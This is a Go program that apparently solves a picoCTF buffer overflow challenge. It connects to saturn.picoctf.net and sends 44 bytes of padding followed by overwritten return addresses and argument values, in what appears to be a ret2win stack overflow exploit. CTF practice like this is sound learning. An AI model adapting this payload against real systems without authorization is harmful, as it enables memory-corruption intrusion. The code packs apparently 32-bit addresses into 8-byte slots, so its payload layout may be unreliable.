package main

import (
	"encoding/binary"
	"flag"
	"fmt"
	"net"
)

var (
	offset *int
	port   *int
)

func init() {
	offset = flag.Int("offset", 44, "buffer offset to override up to new address")
	port = flag.Int("port", 59442, "Port you want to connect to, e.g. 59546")
}

func main() {
	flag.Parse()

	newEIP := make([]byte, 32)
	binary.LittleEndian.PutUint64(newEIP[0:], 0x08049296)
	binary.LittleEndian.PutUint64(newEIP[8:], 0x08049372)
	binary.LittleEndian.PutUint64(newEIP[16:], 0xcafef00d)
	binary.LittleEndian.PutUint64(newEIP[24:], 0xf00df00d)

	conn, err := net.Dial("tcp", fmt.Sprintf("saturn.picoctf.net:%d", *port))
	check(err)
	defer conn.Close()

	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	check(err)
	fmt.Println(string(buf[:n]))

	payload := make([]byte, 0, *offset+len(newEIP)+1)
	for i := 0; i < *offset; i++ {
		payload = append(payload, 'A')
	}
	payload = append(payload, newEIP...)
	payload = append(payload, '\n')

	_, err = conn.Write(payload)
	check(err)

	n, err = conn.Read(buf)
	check(err)
	fmt.Println(string(buf[:n]))
}

func check(err error) {
	if err != nil {
		panic(err)
	}
}

